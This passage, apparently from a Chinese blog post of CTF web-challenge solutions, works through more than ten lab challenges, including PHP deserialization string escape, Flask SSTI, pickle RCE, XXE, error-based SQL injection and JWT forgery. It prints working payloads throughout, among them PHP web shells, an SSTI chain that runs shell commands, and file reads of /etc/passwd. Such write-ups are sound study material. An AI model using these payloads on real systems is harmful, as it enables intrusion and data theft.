{ ?\u0026gt; register.php：\n\u0026lt;?php require_once(\u0026#39;class.php\u0026#39;); if($_POST[\u0026#39;username\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;]) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; if(strlen($username) \u0026lt; 3 or strlen($username) \u0026gt; 16) die(\u0026#39;Invalid user name\u0026#39;); if(strlen($password) \u0026lt; 3 or strlen($password) \u0026gt; 16) die(\u0026#39;Invalid password\u0026#39;); if(!$user-\u0026gt;is_exists($username)) { $user-\u0026gt;register($username, $password); echo \u0026#39;Register OK!\u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;Please Login\u0026lt;/a\u0026gt;\u0026#39;;\t} else { die(\u0026#39;User name Already Exists\u0026#39;); } } else { ?\u0026gt; update.php：\n\u0026lt;?php require_once(\u0026#39;class.php\u0026#39;); if($_SESSION[\u0026#39;username\u0026#39;] == null) { die(\u0026#39;Login First\u0026#39;);\t} if($_POST[\u0026#39;phone\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;email\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;nickname\u0026#39;] \u0026amp;\u0026amp; $_FILES[\u0026#39;photo\u0026#39;]) { $username = $_SESSION[\u0026#39;username\u0026#39;]; if(!preg_match(\u0026#39;/^\\d{11}$/\u0026#39;, $_POST[\u0026#39;phone\u0026#39;])) die(\u0026#39;Invalid phone\u0026#39;); if(!preg_match(\u0026#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/\u0026#39;, $_POST[\u0026#39;email\u0026#39;])) die(\u0026#39;Invalid email\u0026#39;); if(preg_match(\u0026#39;/[^a-zA-Z0-9_]/\u0026#39;, $_POST[\u0026#39;nickname\u0026#39;]) || strlen($_POST[\u0026#39;nickname\u0026#39;]) \u0026gt; 10) die(\u0026#39;Invalid nickname\u0026#39;); $file = $_FILES[\u0026#39;photo\u0026#39;]; if($file[\u0026#39;size\u0026#39;] \u0026lt; 5 or $file[\u0026#39;size\u0026#39;] \u0026gt; 1000000) die(\u0026#39;Photo size error\u0026#39;); move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;])); $profile[\u0026#39;phone\u0026#39;] = $_POST[\u0026#39;phone\u0026#39;]; $profile[\u0026#39;email\u0026#39;] = $_POST[\u0026#39;email\u0026#39;]; $profile[\u0026#39;nickname\u0026#39;] = $_POST[\u0026#39;nickname\u0026#39;]; $profile[\u0026#39;photo\u0026#39;] = \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;]); $user-\u0026gt;update_profile($username, serialize($profile)); echo \u0026#39;Update Profile Success!\u0026lt;a href=\u0026#34;profile.php\u0026#34;\u0026gt;Your Profile\u0026lt;/a\u0026gt;\u0026#39;; } else { ?\u0026gt; profile.php：\n\u0026lt;?php require_once(\u0026#39;class.php\u0026#39;); if($_SESSION[\u0026#39;username\u0026#39;] == null) { die(\u0026#39;Login First\u0026#39;);\t} $username = $_SESSION[\u0026#39;username\u0026#39;]; $profile=$user-\u0026gt;show_profile($username); if($profile == null) { header(\u0026#39;Location: update.php\u0026#39;); } else { $profile = unserialize($profile); $phone = $profile[\u0026#39;phone\u0026#39;]; $email = $profile[\u0026#39;email\u0026#39;]; $nickname = $profile[\u0026#39;nickname\u0026#39;]; $photo = base64_encode(file_get_contents($profile[\u0026#39;photo\u0026#39;])); ?\u0026gt; class.php：\n\u0026lt;?php require(\u0026#39;config.php\u0026#39;); class user extends mysql{ private $table = \u0026#39;users\u0026#39;; public function is_exists($username) { $username = parent::filter($username); $where = \u0026#34;username = \u0026#39;$username\u0026#39;\u0026#34;; return parent::select($this-\u0026gt;table, $where); } public function register($username, $password) { $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(\u0026#39;username\u0026#39;, \u0026#39;password\u0026#39;); $value_list = Array($username, md5($password)); return parent::insert($this-\u0026gt;table, $key_list, $value_list); } public function login($username, $password) { $username = parent::filter($username); $password = parent::filter($password); $where = \u0026#34;username = \u0026#39;$username\u0026#39;\u0026#34;; $object = parent::select($this-\u0026gt;table, $where); if ($object \u0026amp;\u0026amp; $object-\u0026gt;password === md5($password)) { return true; } else { return false; } } public function show_profile($username) { $username = parent::filter($username); $where = \u0026#34;username = \u0026#39;$username\u0026#39;\u0026#34;; $object = parent::select($this-\u0026gt;table, $where); return $object-\u0026gt;profile; } public function update_profile($username, $new_profile) { $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = \u0026#34;username = \u0026#39;$username\u0026#39;\u0026#34;; return parent::update($this-\u0026gt;table, \u0026#39;profile\u0026#39;, $new_profile, $where); } public function __tostring() { return __class__; } } class mysql { private $link = null; public function connect($config) { $this-\u0026gt;link = mysql_connect( $config[\u0026#39;hostname\u0026#39;], $config[\u0026#39;username\u0026#39;], $config[\u0026#39;password\u0026#39;] ); mysql_select_db($config[\u0026#39;database\u0026#39;]); mysql_query(\u0026#34;SET sql_mode=\u0026#39;strict_all_tables\u0026#39;\u0026#34;); return $this-\u0026gt;link; } public function select($table, $where, $ret = \u0026#39;*\u0026#39;) { $sql = \u0026#34;SELECT $ret FROM $table WHERE $where\u0026#34;; $result = mysql_query($sql, $this-\u0026gt;link); return mysql_fetch_object($result); } public function insert($table, $key_list, $value_list) { $key = implode(\u0026#39;,\u0026#39;, $key_list); $value = \u0026#39;\\\u0026#39;\u0026#39; . implode(\u0026#39;\\\u0026#39;,\\\u0026#39;\u0026#39;, $value_list) . \u0026#39;\\\u0026#39;\u0026#39;; $sql = \u0026#34;INSERT INTO $table ($key) VALUES ($value)\u0026#34;; return mysql_query($sql); } public function update($table, $key, $value, $where) { $sql = \u0026#34;UPDATE $table SET $key = \u0026#39;$value\u0026#39; WHERE $where\u0026#34;; return mysql_query($sql); } public function filter($string) { $escape = array(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;); $escape = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $escape) . \u0026#39;/\u0026#39;; // $escape = \u0026#39;/\\|\\\\\\\\/\u0026#39;; $string = preg_replace($escape, \u0026#39;_\u0026#39;, $string); $safe = array(\u0026#39;select\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;where\u0026#39;); $safe = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $safe) . \u0026#39;/i\u0026#39;; // $safe = \u0026#39;/select|insert|update|delete|where/i\u0026#39;; return preg_replace($safe, \u0026#39;hacker\u0026#39;, $string); } public function __tostring() { return __class__; } } session_start(); $user = new user(); $user-\u0026gt;connect($config); PHP版本为5.6.40，主要关注update.php中的序列化，profile.php中的反序列化以及class.php中的filter函数，登录注册等页面都不存在sql注入。尝试在profile.php中获取到config.php的文件内容，但是update.php中的photo无法通过传参控制，结合class.php中filter函数对过滤字符where更换为hacker的操作，导致字符变多，考虑利用 数组绕过preg_match+数组绕过strlen+字符串逃逸 的方法在nickname处恶意构造序列化字符串：\n------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\u0026#34;phone\u0026#34;\r12345678901\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\u0026#34;email\u0026#34;\r114514@qq.com\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\u0026#34;nickname[]\u0026#34;\rwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;}\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\u0026#34;photo\u0026#34;; filename=\u0026#34;test.php\u0026#34;\rContent-Type: application/php\rtesttesttest\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1-- 访问profile.php就可以获取base64数据流，解码可得config.php：\n\u0026lt;?php $config[\u0026#39;hostname\u0026#39;] = \u0026#39;127.0.0.1\u0026#39;; $config[\u0026#39;username\u0026#39;] = \u0026#39;root\u0026#39;; $config[\u0026#39;password\u0026#39;] = \u0026#39;qwertyuiop\u0026#39;; $config[\u0026#39;database\u0026#39;] = \u0026#39;challenges\u0026#39;; $flag = \u0026#39;flag{4ca493b0-6039-4a8e-9dae-6dd61a58d279}\u0026#39;; ?\u0026gt; 多版本PHP环境在线测试\n[SUCTF 2019]Pythonginx 本题的环境好像已经无法获取flag了\n@app.route(\u0026#39;/getUrl\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def getUrl(): url = request.args.get(\u0026#34;url\u0026#34;) host = parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 111\u0026#34; parts = list(urlsplit(url)) host = parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 222 \u0026#34; + host newhost = [] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1] = \u0026#39;.\u0026#39;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host = parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return urllib.request.urlopen(finalUrl).read() else: return \u0026#34;我扌 your problem? 333 idna解析非ascii字符标准化问题：\nfile://suctf.ⅽc/../../../etc/passwd 相关工具：\n搜索相似的unicode字符网站\nUnicode fuzzer\n参考文章：\nhttps://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\nhttps://www.tr0y.wang/2020/08/18/IDN/\n[MRCTF2020]套娃 $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if( substr_count($query, \u0026#39;_\u0026#39;) !== 0 || substr_count($query, \u0026#39;%5f\u0026#39;) != 0 ){ die(\u0026#39;Y0u are So cutE!\u0026#39;); } if($_GET[\u0026#39;b_u_p_t\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;b_u_p_t\u0026#39;])){ echo \u0026#34;you are going to the next ~\u0026#34;; } 传参中不能出现下划线，但是php有将特殊符号参数名解析为下划线的特性，preg_match默认单行匹配不会匹配结尾的%0a即换行符：\n?b+u+p+t=23333%0A\r或?b u p t=23333%0A\rhow smart you are ~\rFLAG is in secrettw.php secrettw.php页面源码注释中有一段jsfuck，控制台运行一下：\npost me Merak secrettw.php：\n\u0026lt;?php error_reporting(0); include \u0026#39;takeip.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;.\u0026#39;); include \u0026#39;flag.php\u0026#39;; if(isset($_POST[\u0026#39;Merak\u0026#39;])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo \u0026#39;Local access only!\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; $ip = getIp(); if($ip!=\u0026#39;127.0.0.1\u0026#39;) echo \u0026#34;Sorry,you don\u0026#39;t have permission! Your ip is :\u0026#34;.$ip; if($ip === \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; file_get_contents($_GET[\u0026#39;2333\u0026#39;]) === \u0026#39;todat is a happy day\u0026#39; ){ echo \u0026#34;Your REQUEST is:\u0026#34;.change($_GET[\u0026#39;file\u0026#39;]); echo file_get_contents(change($_GET[\u0026#39;file\u0026#39;])); } ?\u0026gt; 测试可知getIP检测的是Client-IP头：\n?2333=data://,todat%20is%20a%20happy%20day\u0026amp;file=ZmpdYSZmXGI= Flag is here~But how to get it?Local access only!\u0026lt;br/\u0026gt;Your REQUEST is:flag.php\u0026lt;?php $flag = \u0026#39;flag{902b4616-9d7d-49a9-9b98-1b5b1a15833a}\u0026#39;; echo \u0026#34;Flag is here~But how to get it?\u0026#34;; ?\u0026gt; 参考文章：\nhttps://www.cnblogs.com/hithub/p/16804708.html\n[CSCCTF 2019 Qual]FlaskLight \u0026lt;!-- Parameter Name: search --\u0026gt;\r\u0026lt;!-- Method: GET --\u0026gt; 测试了一下得知是python2：\nwaf过滤了global和system，用request.arg来绕过：\n?search={{()[request.args.v1][request.args.v2][-1][request.args.v3]()[58][request.args.v4][request.args.v5][request.args.v6][request.args.v7](request.args.v8)}}\u0026amp;v1=__class__\u0026amp;v2=__mro__\u0026amp;v3=__subclasses__\u0026amp;v4=__init__\u0026amp;v5=__globals__\u0026amp;v6=__builtins__\u0026amp;v7=eval\u0026amp;v8=__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat /fla*/coomme_geeeett_youur_flek\u0026#34;).read() flag{b658a75b-8b7e-4298-907f-b06701d89bf8}\n[watevrCTF-2019]Cookie Store Cookie中的session只经过base64编码，解码可得明文内容，伪造money:100即可，购买flag：\nSet-Cookie: session=eyJtb25leSI6IDAsICJoaXN0b3J5IjogWyJZdW1teSBjaG9jb2xhdGUgY2hpcCBjb29raWUiLCAiZmxhZ3szMTM2YTZmNC03YjhlLTQ0MmUtYjFiYy00NzcyNzFlNzJkMDd9XG4iXX0=; {\u0026#34;money\u0026#34;: 0, \u0026#34;history\u0026#34;: [\u0026#34;Yummy chocolate chip cookie\u0026#34;, \u0026#34;flag{3136a6f4-7b8e-442e-b1bc-477271e72d07}\\n\u0026#34;]} [WUSTCTF2020]CV Maker 登录成功后有个文件上传，上传空文件可以看到warning：\nWarning: exif_imagetype(): Filename cannot be empty in /var/www/html/profile.php on line 76 查了一下exif_imagetype()，这个函数通过读取图像的前几个字节并检查其签名来工作，上传一句话木马：\nContent-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;shell.php\u0026#34;\rContent-Type: application/gif\rGIF89a\u0026lt;?php @eval($_POST[\u0026#34;shell\u0026#34;]); ?\u0026gt; 蚁剑连上拿flag：flag{c976d3cc-196a-4b97-b6be-b4a8911c6e7d}\n[CISCN2019 华北赛区 Day1 Web2]ikun 网页中有一段话：\nikun们冲鸭,一定要买到lv6!!! 尝试先找到lv6的page页数：\nimport requests url = \u0026#34;http://49170cc3-3b88-4c25-972e-e197bf95c016.node5.buuoj.cn:81/shop\u0026#34; for i in range(500): params = {\u0026#34;page\u0026#34;:f\u0026#34;{i}\u0026#34;} resp = requests.get(url, params) if (\u0026#34;/static/img/lv/lv6.png\u0026#34; in resp.text): print(\u0026#34;Found page: \u0026#34; + str(i)) # Found page: 181 购买前需要登录，直接买钱是不够的，抓包看一下，发现可以改折扣：\n_xsrf=2%7C807606a1%7C9140beb256c835e2363761153abb462b%7C1755505534\u0026amp;id=1624\u0026amp;price=1145141919.0\u0026amp;discount=0.00000001 之后会跳转到：/b1g_m4mber，不过只有admin才能访问，尝试伪造JWT，尝试爆破得到密钥：1Kun，修改username为admin：\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 网页源码给出了提示，存在备份文件:\n\u0026lt;a href=\u0026#34;/static/asd1f654e683wq/www.zip\u0026#34; \u0026gt;\u0026lt;span style=\u0026#34;visibility:hidden\u0026#34;\u0026gt;删库跑路前我留了好东西在这里\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; Admin.py中存在pickle反序列化漏洞：\nimport tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \u0026#34;admin\u0026#34;: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) else: return self.render(\u0026#39;no_ass.html\u0026#39;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(\u0026#39;become\u0026#39;) p = pickle.loads(urllib.unquote(become)) return self.render(\u0026#39;form.html\u0026#39;, res=p, member=1) except: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) python2环境，exp.py：\nimport pickle from urllib import quote class payload(object): def __reduce__(self): return (eval, (\u0026#34;open(\u0026#39;/flag.txt\u0026#39;,\u0026#39;r\u0026#39;).read()\u0026#34;,)) a = pickle.dumps(payload()) a = quote(a) print(a) 补上_xsrf，传参become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\nflag{e5e38db3-dd24-4248-81f0-02e9ae2fe8f0}\n[红明谷CTF 2021]write_shell function check($input){ if(preg_match(\u0026#34;/\u0026#39;| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\u0026#34;,$input)){ // if(preg_match(\u0026#34;/\u0026#39;| |_|=|php/\u0026#34;,$input)){ die(\u0026#39;hacker!!!\u0026#39;); }else{ return $input; } } 过滤了eval还有下划线导致一句话木马和许多执行系统命令的函数无法使用，同时过滤了php导致常规的\u0026lt;?php ?\u0026gt;无法写入文件，想到两种方法绕过\n方法一：短标签+assert+hex2bin构造一句话木马\n\u0026lt;?=assert(hex2bin(\u0026#34;6576616c28245f524551554553545b277368656c6c275d293b\u0026#34;))?\u0026gt;\r即\u0026lt;?=assert(eval($_REQUEST[\u0026#39;shell\u0026#39;]);)?\u0026gt; 蚁剑连上找到flag：flag{ba1d16ab-0fef-46cb-977c-3f2aea47a494}\n方法二：短标签+反引号执行系统命令并返回结果+%09绕过空格\n\u0026lt;?=`cat%09/flllllll1112222222lag`?\u0026gt; [RCTF2015]EasySQL 修改密码处存在报错注入，username是双引号闭合的，注册时进行注入即可，过滤了空格 and or mid left right substring：\n114\u0026#34;||updatexml(1,concat(0x7e,database()),1)#\rXPATH syntax error: \u0026#39;~web_sqli\u0026#39;\r114\u0026#34;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#\rXPATH syntax error: \u0026#39;~article,flag,users\u0026#39;\r114\u0026#34;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flag\u0026#39;))),1)#\rXPATH syntax error: \u0026#39;~flag\u0026#39;\r114\u0026#34;||updatexml(1,concat(0x7e,(select(flag)from(flag))),1)#\rXPATH syntax error: \u0026#39;~RCTF{Good job! But flag not her\u0026#39;\r114\u0026#34;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;users\u0026#39;))),1)#\rXPATH syntax error: \u0026#39;~name,pwd,email,real_flag_1s_her\u0026#39;\r114\u0026#34;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\u0026#39;flag\u0026#39;))),1)#\rXPATH syntax error: \u0026#39;~flag{6c7b5915-cce7-456b-895e-1c\u0026#39;\r114\u0026#34;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\u0026#39;flag\u0026#39;)))),1)#\rXPATH syntax error: \u0026#39;~}a64df4b619c1-e598-b654-7ecc-51\u0026#39; flag{6c7b5915-cce7-456b-895e-1c916b4fd46a}\n[GWCTF 2019]枯燥的抽奖 check.php：\n\u0026lt;?php #这不是抽奖程序的源代码！不许看！ header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); session_start(); if(!isset($_SESSION[\u0026#39;seed\u0026#39;])){ $_SESSION[\u0026#39;seed\u0026#39;]=rand(0,999999999); } mt_srand($_SESSION[\u0026#39;seed\u0026#39;]); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 10); echo \u0026#34;\u0026lt;p id=\u0026#39;p1\u0026#39;\u0026gt;\u0026#34;.$str_show.\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; if(isset($_POST[\u0026#39;num\u0026#39;])){ if($_POST[\u0026#39;num\u0026#39;]===$str){x echo \u0026#34;\u0026lt;p id=flag\u0026gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}\u0026lt;/p\u0026gt;\u0026#34;; } else{ echo \u0026#34;\u0026lt;p id=flag\u0026gt;没抽中哦，再试试吧\u0026lt;/p\u0026gt;\u0026#34;; } } show_source(\u0026#34;check.php\u0026#34;); 使用php_mt_seed工具，生成该工具参数所需的格式：\nd = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; c = \u0026#39;Z1wu33G2yq\u0026#39; output = \u0026#39;\u0026#39; for s in c: output += str(d.index(s)) + \u0026#39; \u0026#39; + str(d.index(s)) + \u0026#39; 0 61 \u0026#39; print(output) $ ./php_mt_seed 60 60 0 61 37 37 0 61 16 16 0 61 53 53 0 61 33 33 0 61 33 33 0 61 20 20 0 61 6 6 0 61 11 11 0 61 61 61 0 61 Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 Version: 3.0.7 to 5.2.0 Found 0, trying 0xe0000000 - 0xffffffff, speed 2505.4 Mseeds/s Version: 5.2.1+ Found 0, trying 0x00000000 - 0x0fffffff, speed 0.0 Mseeds/s seed = 0x013e80f3 = 12559208 (PHP 7.1.0+) Found 1, trying 0xb0000000 - 0xbfffffff, speed 210.6 Mseeds/s 根据seed生成20位字符串：\n\u0026lt;?php mt_srand(12559208); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 20); echo $str_show; ?\u0026gt; Z1wu33G2yq3xInpVgJAj，抽奖，就是那么枯燥且无味，给你flag{5fe58a16-cc68-47aa-9811-a11f87a7b657}\n[NCTF2019]True XML cookbook 存在XXE外部实体注入漏洞：\n\u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;file;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;114514\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 用php伪协议读取doLogin.php源码：\n\u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;file;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;114514\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; doLogin.php：\n\u0026lt;?php /** * autor: c0ny1 * date: 2018-2-7 */ $USERNAME = \u0026#39;admin\u0026#39;; //账号 $PASSWORD = \u0026#39;024b87931a03f738fff6693ce0a78c88\u0026#39;; //密码 $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(\u0026#39;php://input\u0026#39;); try{ $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-\u0026gt;username; $password = $creds-\u0026gt;password; if($username == $USERNAME \u0026amp;\u0026amp; $password == $PASSWORD){ $result = sprintf(\u0026#34;\u0026lt;result\u0026gt;\u0026lt;code\u0026gt;%d\u0026lt;/code\u0026gt;\u0026lt;msg\u0026gt;%s\u0026lt;/msg\u0026gt;\u0026lt;/result\u0026gt;\u0026#34;,1,$username); }else{ $result = sprintf(\u0026#34;\u0026lt;result\u0026gt;\u0026lt;code\u0026gt;%d\u0026lt;/code\u0026gt;\u0026lt;msg\u0026gt;%s\u0026lt;/msg\u0026gt;\u0026lt;/result\u0026gt;\u0026#34;,0,$username); }\t}catch(Exception $e){ $result = sprintf(\u0026#34;\u0026lt;result\u0026gt;\u0026lt;code\u0026gt;%d\u0026lt;/code\u0026gt;\u0026lt;msg\u0026gt;%s\u0026lt;/msg\u0026gt;\u0026lt;/result\u0026gt;\u0026#34;,3,$e-\u0026gt;getMessage()); } header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); echo $result; ?\u0026gt; 获取/proc/net/fib_trie，探测内网ip：10.244.166.236的C段，爆破得到flag\n[CISCN2019 华北赛区 Day1 Web5]CyberPunk 页面注释有个file，存在文件包含，php伪协议读取源码\nindex.php：\n\u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;/var/www/html/\u0026#39;); // $file = $_GET[\u0026#34;file\u0026#34;]; $file = (isset($_GET[\u0026#39;file\u0026#39;]) ? $_GET[\u0026#39;file\u0026#39;] : null); if (isset($file)){ if (preg_match(\u0026#34;/phar|zip|bzip2|zlib|data|input|%00/i\u0026#34;,$file)) { echo(\u0026#39;no way!\u0026#39;); exit; } @include($file); } ?\u0026gt; search.php：\n\u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); if(!$row) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;\u0026lt;p\u0026gt;姓名:\u0026#34;.$row[\u0026#39;user_name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, 电话:\u0026#34;.$row[\u0026#39;phone\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, 地址:\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } else { $msg = \u0026#34;未找到订单!\u0026#34;; } }else { $msg = \u0026#34;信息不全\u0026#34;; } ?\u0026gt; change.php：\n\u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;address\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $address = addslashes($_POST[\u0026#34;address\u0026#34;]); $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); $sql = \u0026#34;update `user` set `address`=\u0026#39;\u0026#34;.$address.\u0026#34;\u0026#39;, `old_address`=\u0026#39;\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026#39; where `user_id`=\u0026#34;.$row[\u0026#39;user_id\u0026#39;]; $result = $db-\u0026gt;query($sql); if(!$result) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;订单修改成功\u0026#34;; } else { $msg = \u0026#34;未找到订单!\u0026#34;; } }else { $msg = \u0026#34;信息不全\u0026#34;; } ?\u0026gt; delete.php：\n\u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = 